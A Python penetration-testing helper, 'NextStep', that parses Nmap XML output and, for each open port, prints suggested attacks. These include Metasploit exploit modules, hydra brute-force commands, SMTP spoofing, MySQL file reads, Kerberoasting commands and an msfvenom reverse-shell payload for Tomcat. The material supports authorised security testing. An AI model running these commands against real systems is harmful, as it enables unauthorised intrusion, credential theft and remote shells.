import xml.etree.ElementTree as ET
import os
import sys

print("\033[34m                                                                  &             \033[0m")
print("\033[34m                                          &&&%              &&&&&&&&&&&&        \033[0m")
print("\033[34m                                   &&&    &&&%             &&&         &&&      \033[0m")
print("\033[34m &&&&&&&&&&   &&&&&&&&&&  &&&&&&& &&&&&&  &&&&&&&&&&      &&&    \033[32m///\033[0m\033[34m    &&&     \033[0m")
print("\033[34m &&&    *&&& &&&&    &&&% &&&&     &&&    &&&&    &&&   &&&&&   \033[32m///\033[0m\033[34m     &&/     \033[0m")
print("\033[34m &&&     &&&  &&&    &&&  &&&&     &&&    &&&%    &&&    &&&   \033[32m///\033[0m\033[34m     &&&      \033[0m")
print("\033[34m &&&     &&&   &&&&&&&&   &&&&      &&&&  &&&%    &&&         \033[32m///\033[0m\033[34m     &&&   \033[32m////\033[0m\033[34m  \033[0m")
print("\033[32m                                                             \033[32m///\033[0m\033[34m     &&&   \033[32m/////\033[0m\033[34m  \033[0m")
print("\033[32m ///////////  /////// //////////  /////////   //////////     \033[32m///\033[0m\033[34m    &&&    \033[32m///  \033[0m")
print("\033[32m////    ////  ////    ////////// ///////////  ///    ////    \033[32m///\033[0m\033[34m    &     \033[32m///   \033[0m")
print("\033[32m ///*   ////  ///     ///    ///  ///   ////  ///    ////     \033[32m///\033[0m        \033[32m///    \033[0m")
print("\033[32m  //////////  ///       //////     ///////    ///    ////       \033[32m//////////\033[0m      \033[0m")
print("\033[32m ///    ////                                                                    \033[0m")
print("\033[32m  ////////   \033[0m")

print("NextStep\nThe tool to help you find the next step of your test")
from colorama import init, Back

init()

orange_box = Back.YELLOW + " " * 2 + Back.RESET
green_box = Back.GREEN + " " * 2 + Back.RESET
blue_box = Back.BLUE + " " * 2 + Back.RESET

def main():
    if len(sys.argv) < 2:
        print("Usage: python nextstep.py <nmap xml file.xml>")
        sys.exit(1)
        
    nmap_xml_file = sys.argv[1]
    # Read the Nmap XML output from a file
    with open(nmap_xml_file, "r") as f:
        nmap_xml = f.read()
    open_ports = get_open_ports(nmap_xml)
    green_ports = [21, 23, 53, 88, 139, 161, 445, 2049, 3306, 5900]
    orange_ports = [80, 443, 8080, 5800, 8000]
    blue_ports = [22, 25, 69, 3389]
    port_selected = False
    print("\n")
    print("Key:")
    print(green_box + "  Good Ports to prioritise")
    print(blue_box + "  Likely to be a secondary priority")
    print(orange_box + "  Web based services")
    tree = ET.parse(nmap_xml_file)
    root = tree.getroot()
    num_hosts = len(root.findall(".//host"))
    print(f"\nNumber of hosts identified: {num_hosts}\n")
    while True:
            if not port_selected:
                # Print the list of open ports
                print("Open ports:")
                for port_number in sorted(open_ports.keys(), key=int):
                    if int(port_number) in green_ports:
                        print("\033[92;1m  {}: {} devices\033[0m".format(port_number, len(open_ports[port_number])))
                    elif int(port_number) in orange_ports:
                        print("\033[93;1m  {}: {} devices\033[0m".format(port_number, len(open_ports[port_number])))
                    elif int(port_number) in blue_ports:
                        print("\033[94;1m  {}: {} devices\033[0m".format(port_number, len(open_ports[port_number])))
                    else:
                        print("  {}: {} devices".format(port_number, len(open_ports[port_number])))
            # Get the port number from the user
            port_number = input("\nEnter a port number (or 'q' to quit, 'b' to go back to menu): ")
            if port_number == 'q':
                break
            if port_number == 'b':
                port_selected = False
                print("\033[34m                                                                  &             \033[0m")
                print("\033[34m                                          &&&%              &&&&&&&&&&&&        \033[0m")
                print("\033[34m                                   &&&    &&&%             &&&         &&&      \033[0m")
                print("\033[34m &&&&&&&&&&   &&&&&&&&&&  &&&&&&& &&&&&&  &&&&&&&&&&      &&&    \033[32m///\033[0m\033[34m    &&&     \033[0m")
                print("\033[34m &&&    *&&& &&&&    &&&% &&&&     &&&    &&&&    &&&   &&&&&   \033[32m///\033[0m\033[34m     &&/     \033[0m")
                print("\033[34m &&&     &&&  &&&    &&&  &&&&     &&&    &&&%    &&&    &&&   \033[32m///\033[0m\033[34m     &&&      \033[0m")
                print("\033[34m &&&     &&&   &&&&&&&&   &&&&      &&&&  &&&%    &&&         \033[32m///\033[0m\033[34m     &&&   \033[32m////\033[0m\033[34m  \033[0m")
                print("\033[32m                                                             \033[32m///\033[0m\033[34m     &&&   \033[32m/////\033[0m\033[34m  \033[0m")
                print("\033[32m ///////////  /////// //////////  /////////   //////////     \033[32m///\033[0m\033[34m    &&&    \033[32m///  \033[0m")
                print("\033[32m////    ////  ////    ////////// ///////////  ///    ////    \033[32m///\033[0m\033[34m    &     \033[32m///   \033[0m")
                print("\033[32m ///*   ////  ///     ///    ///  ///   ////  ///    ////     \033[32m///\033[0m        \033[32m///    \033[0m")
                print("\033[32m  //////////  ///       //////     ///////    ///    ////       \033[32m//////////\033[0m      \033[0m")
                print("\033[32m ///    ////                                                                    \033[0m")
                print("\033[32m  ////////   \033[0m")
                print("NextStep\nThe tool to help you find the next step of your test")
                
                print("\nKey:")
                print(green_box + "  Good Ports to prioritise")
                print(blue_box + "  Likely to be a secondary priority")
                print(orange_box + "  Web based services")
                tree = ET.parse(nmap_xml_file)
                root = tree.getroot()
                num_hosts = len(root.findall(".//host"))
                print(f"\nNumber of hosts identified: {num_hosts}\n")
                continue
            if port_number in open_ports:
                # Print the IP addresses of the devices with the selected port open
                print("\n\033[1mDevices with port {} open:\033[0m".format(port_number))
                for ip in open_ports[port_number]:
                    print("  {}".format(ip))
                service_info = get_service_info(int(port_number))
                print("\nThis service is {} and you should investigate the following potential issues \n{}".format(service_info[0], service_info[1]))
                port_selected = True
            else:
                print("Invalid port number")


def get_open_ports(nmap_xml):
    """
    Parses the Nmap XML output and returns a dictionary of open ports.
    The dictionary keys are port numbers and the values are lists of IP addresses.
    """
    
    #Banner

       
    open_ports = {}
    root = ET.fromstring(nmap_xml)
    for host in root.findall("./host"):
        ip = host.find("address").get("addr")
        for port in host.findall("./ports/port"):
            port_number = port.get("portid")
            state = port.find("state").get("state")
            if state == "open":
                if port_number in open_ports:
                    open_ports[port_number].append(ip)
                else:
                    open_ports[port_number] = [ip]
    return open_ports

def get_service_info(port_number):
    """
    Returns a tuple of the service name and number of vulnerabilities associated with a given port number
    """
    # Example data for demonstration purposes
    port_data = {
        21: ("FTP", "\033[04m\nAnonymous Login\033[0m\n\tftp <IP>\n\tYou will be prompted for a username and password, use credentials anonymous:<blank>\n\033[04mSoftware Vulnerability\033[0m\n\tThere are known vulnerable versions of FTP software\n\tProFTP\n\t\tmsf module: exploit/unix/ftp/proftpd_modcopy_exec\n\tVSFTP\n\t\tmsf module: exploit/unix/ftp/vsftpd_234_backdoor"),
        22: ("SSH", "\033[04m\nUser Enumeration\033[0m\n\tCVE-2018-15473 is an openSSH user enumeration vulnerability\n\tmsf module: auxiliary/scanner/ssh/ssh_enumusers\n\033[04mBrute Force Attacks\033[0m\n\tmsf module: auxiliary/scanner/ssh/ssh_login\n\thydra -l <username> -P <wordlist> <IP> ssh\n\033[04mWeak Credentials\033[0m\n\tDon't discount the benefit of guessing passwords or googling default credentials"),
        23: ("Telnet", "\033[04mPlaintext Protocol\033[0m\n\tIf you are able to monitor network traffic you may be able to identify the credentials needed\n\033[04mBrute Force Attacks\033[0m\n\thydra -l <username> -P <wordlist> <IP> telnet\n\033[04mSolaris Telnet Vulnerabilites\033[0m\n\tSolaris has some well known telnet vulnerabilities, some of the more well known are:\n\tmsf module: /exploit/solaris/telnet/ttyprompt\n\tmsf module: /exploit/solaris/telnet/fuser"),
        25: ("SMTP", "\033[04m\nEnumeration\033[0m\n\tSMTP enumeration involves using a combination of brute-force and dictionary attacks to obtain a list of valid email addresses\n\ttelnet <mail_server> 25\n\tVRFY <username>\n\tEXPN <username>\n\tRCPT TO:<username>\n\033[04mRelay\033[0m\n\tSMTP open relay can be used to send email anonymously or to bypass email restrictions\n\ttelnet <mail_server> 25\n\tMAIL FROM:<sender>\n\tRCPT TO:<recipient>\n\tDATA\n\t.\n\033[04mSpoofing\033[0m\n\tSMTP email spoofing involves sending an email with a forged sender address to deceive the recipient\n\ttelnet <mail_server> 25\n\tMAIL FROM:<spoofed_address>\n\tRCPT TO:<recipient>\n\tDATA\n\t.\n"),
        53: ("DNS", "\033[04m\nZone Transfer\033[0m\n\tA zone transfer is a request to a Name Server for all the information about a domain\n\tdig @<nameserver> <domainname> -t axfr\n\thost -t axfr <domainname> <nameserver>\n\033[04mForward Lookups\033[0m\n\tmForward lookups are how DNS works, where a user makes a request for a hostname and it is converted to an IP address by the DNS server\n\tping <hostname>.<domainname>\n\thost <hostname>.<domainname>\n\tfor name in $(cat wordlist.txt);do host $name.<domainname>;done\n\033[04mReverse Lookup\033[0m\n\tReverse lookups are when an IP address is provided in an attempt to understand if a DNS server knows the hostname\n\tdig -x <IP> @<nameserver>"),
 #       88: ("Kerberos", "\033[04m\nASREP Roasting\033[0m\n\tASREP Roasting looks for users without the Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH)\n\tLinux Commands\n\t\tTest all users in a text file\n\t\tpython GetNPUsers.py <domain> -usersfile <userlist> -format hashcat -outputfile hashes.asrep\n\t\tUse domain credentials to get targets\n\t\tpython GetNPUsers.py <domain>/<user:pass> -request -format hashcat -outputfile hashes.asrep\n\t\tkerbrute -users <userlist> --dc <IP> -d <domain>\n\tWindows Commands\n\t\tRubeus.exe asreproast /format:hashcat /outfile:hashes.asrep [/user:username]\n\033[04mKerberoasting\033[0m\n\tHarvest TGS tickets for services running on behalf of users, evidenced by \"ServicePrincipalName\" is not null\n\tLinux Commands\n\t\tmsf module: auxiliary/gather/get_user_spns\n\tWindows Commands\n\t\tsetspn.exe -Q */*\n\t\tGet-NetUser -SPN | select serviceprincipalname (use powerview)\n\t\tRubeus.exe kerberoast /stats\n\033[04mOverpass The Hash/Pass The Key\033[0m\n\tThis attack requires the use of the target users NTLM hash\n\tpython getTGT.py <domain>/<user> -hashes <NTLMhash>\n\texport KRB5CCNAME=/root/impacket-examples/<domain>.ccache\n\tpython psexec.py <domain>/<user>@<host> -k -no-pass"),
        139: ("NetBIOS", "\033[04m\nEnumeration\033[0m\n\tNetBIOS/SMB enumeration involves discovering information about shares, users, and groups on Windows systems\n\tnbtscan <ip_address>\n\tnmblookup -A <ip_address>\n\tnmap -p 139 --script smb-enum-shares.nse <ip_address>\n\033[04mExploitation\033[0m\n\tNetBIOS/SMB can be exploited for remote code execution and lateral movement in a Windows network\n\tmsf module: exploit/windows/smb/ms08_067_netapi\n\tmsf module: exploit/windows/smb/ms17_010_psexec\n\033[04mBrute-Force\033[0m\n\tNetBIOS/SMB authentication can be brute-forced using tools such as Hydra\n\thydra -L <userlist> -P <passwordlist> <ip_address> smb"),
        389: ("LDAP", "\033[04m\nEnumeration\033[0m\n\tLDAP enumeration involves searching for information on LDAP servers, such as users and groups\n\tldapsearch -x -h <ldap_server> -b <base_dn> -s sub '(objectclass=*)'\n\tldapsearch -x -h <ldap_server> -b <base_dn> -s sub '(objectclass=user)' '*' -v\n\033[04mBrute-Force\033[0m\n\tLDAP authentication can be brute-forced using a username and password list\n\tldapsearch -x -h <ldap_server> -D '<username>@<domain>' -w <password> -b <base_dn> -s sub '(objectclass=*)'\n\033[04mInjections\033[0m\n\tLDAP injections can be used to bypass authentication and retrieve sensitive information\n\tldapsearch -x -h <ldap_server> -b '<base_dn>)(cn=admin' '*' -s sub\n"),
	445: ("SMB", "\033[04m\nShares\033[0m\n\tSMB enumeration involves discovering information about shares, users, and groups on Windows systems\n\tnmap -p 445 --script smb-enum-shares.nse <IP>\n\tenum4linux -a <IP>\n\tmsf module: auxiliary/scanner/smb/smb_enumshares\n\033[04mExploitation\033[0m\n\tSMB can be exploited for remote code execution and lateral movement in a Windows network\n\tmsf module: exploit/windows/smb/ms08_067_netapi\n\tmsf module: exploit/windows/smb/ms17_010_psexec\n\033[04mBrute-Force\033[0m\n\tSMB authentication can be brute-forced using tools such as Hydra\n\thydra -L <userlist> -P <passwordlist> <ip_address> smb"),
        3389: ("RDP", "\033[04m\nBrute Forcing\033[0m\n\tOnly Admin accounts should have no lockout policy so be aware of that when conducing a brute force attack\n\thydra -V -f -l <username> -P <wordlist> rdp://<IP>\n\033[04mExploitation\033[0m\n\tmsf module: exploit/windows/rdp/cve_2019_0708_bluekeep_rce"),
        2049: ("NFS", "\033[04m\nIdentify Exportable Shares\033[0m\n\tshowmount -e <IP>\n\tmsfmodule: auxiliary/scanner/nfs/nfsmount\n\033[04mMounting Shares\033[0m\n\tYou will need to create a folder that the NFS share will be mounted to (e.g. mkdir /tmp/nfs)\n\tmount -t nfs <IP>:/<share> <local folder>\n\tmount -t nfs [-o vers=2] <IP>:/<share> <local folder>"),
        3306: ("MySQL", "\033[04m\nRemote Connection\033[0m\n\tWhen you see a MySQL server on the network you can attempt to connect with no password\n\tmysql -u root -h <IP>\n\tYou can authenticate with both a username & password\n\tmysql -u root -p -h <IP>\n\033[04mDatabase Commands\033[0m\n\tmysql> show databases;\n\tmysql> use <database>;\n\tmysql> show tables;\n\tmysql> select * from <table>;\n\033[04mRead System Files\033[0m\n\tmysql> select load_file('<file path>');"),
        161: ("SNMP", "\033[04m\nWeak Community Strings\033[0m\n\tversion 1 & 2c of SNMP use community strings as a way of authenticating to the service\n\tonesixtyone -c <wordlist> -i <IPlist>\n\tsnmpwalk -v <version> -c <community string> <IP>\n\tmsf module: auxiliary/scanner/snmp/snmp_login\n\tmsfmodule: auxiliary/scanner/snmp/snmp_enum"),
        69: ("TFTP", "\033[04m\nGet TFTP File\033[0m\n\tmsf module: auxiliary/scanner/tftp/tftpbrute"),
        8000: ("HTTP Proxy", "\033[04m\nThere are no specific issues/tools to advice for this port\033[0m\n\t"),
        8080: ("HTTP Management Interface", "\033[04m\nTomcat\033[0m\n\tAdmin login\n\t\tmsf module: auxiliary/scanner/http/tomcat_mgr_login\n\tWAR Files\n\t\tmsf module: exploit/multi/http/tomcat_mgr_upload\n\t\tmsf module: exploit/multi/http/tomcat_mgr_deploy\n\t\tmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o <name>.war (remember to set a listener on the LPORT"),
        5900: ("VNC", "\033[04m\nWeb Access\033[0m\n\tVNC can be accessed via a web browser using port 5800 or with a client on 5900\n\033[04mAuthentication Bypass\033[0m\n\tmsf module: auxiliary/admin/vnc/realvnc_41_bypass\n\033[04mUnauthenticated/Weak Access\033[0m\n\tIt is possible that the VNC server may be misconfigured to allow immediate unauthenticated access, if this is the case simply connecting via a tool such as remmina will provide access\n\tIt may also be that accounts such as guest may be enabled with no password"),
        80: ("HTTP", "\033[04m\nWeb Server\033[0m\n\tPort 80 is the standard port used by web servers to serve HTTP traffic\n\tCommon web servers include Apache, Nginx, and IIS, these should be investigated to identify whether there are any vulnerable versions being used\n\033[04mDirectory Brute-Force\033[0m\n\tWeb directories can be brute-forced using tools like Dirbuster or Dirb\n\tUseful directories to look for include /admin, /wp-admin, /phpmyadmin, and /cgi-bin\n\033[04mParameter Manipulation\033[0m\n\tIntercept traffic with a tool such as Burp and attempt to understand whether there are any parameters that can have the value changed.  The goal of this is to see what happens when legitimate and illegitimate values are used\n\033[04mCross-Site Scripting\033[0m\n\tLook for any functionality that allows you to input a string of characters that is then displayed on the screen.  Common proof of concepts are <script>alert(1)</script>\n\033[04mSQL injection\033[0m\n\tLook for any functionality that may be interacting with a backend database and attempt to see whether you can trigger an error in the syntax, common methods are to use \" or \' characters in an attempt to prematurely end the SQL statement\n\033[04mOWASP Issues\033[0m\n\tThere are too many other issues to address but make sure to explore the OWASP Top 10 issues to gain full coverage"),
        443: ("HTTPS", "\033[04m\nWeb Server\033[0m\n\tPort 80 is the standard port used by web servers to serve HTTP traffic\n\tCommon web servers include Apache, Nginx, and IIS, these should be investigated to identify whether there are any vulnerable versions being used\n\033[04mDirectory Brute-Force\033[0m\n\tWeb directories can be brute-forced using tools like Dirbuster or Dirb\n\tUseful directories to look for include /admin, /wp-admin, /phpmyadmin, and /cgi-bin\n\033[04mParameter Manipulation\033[0m\n\tIntercept traffic with a tool such as Burp and attempt to understand whether there are any parameters that can have the value changed.  The goal of this is to see what happens when legitimate and illegitimate values are used\n\033[04mCross-Site Scripting\033[0m\n\tLook for any functionality that allows you to input a string of characters that is then displayed on the screen.  Common proof of concepts are <script>alert(1)</script>\n\033[04mSQL injection\033[0m\n\tLook for any functionality that may be interacting with a backend database and attempt to see whether you can trigger an error in the syntax, common methods are to use \" or \' characters in an attempt to prematurely end the SQL statement\n\033[04mOWASP Issues\033[0m\n\tThere are too many other issues to address but make sure to explore the OWASP Top 10 issues to gain full coverage")
    }
    if port_number in port_data:
        return port_data[port_number]
    else:
        return ("Unknown", "N/A")



if __name__ == '__main__':
    main()
